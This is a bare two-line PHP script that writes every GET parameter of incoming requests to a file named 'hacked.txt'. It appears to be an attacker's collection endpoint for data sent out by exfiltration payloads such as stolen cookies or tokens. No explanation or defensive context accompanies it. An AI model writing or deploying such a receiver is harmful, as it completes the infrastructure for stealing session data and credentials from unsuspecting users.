<?php
file_put_contents('hacked.txt', json_encode($_GET) . "\n", FILE_APPEND);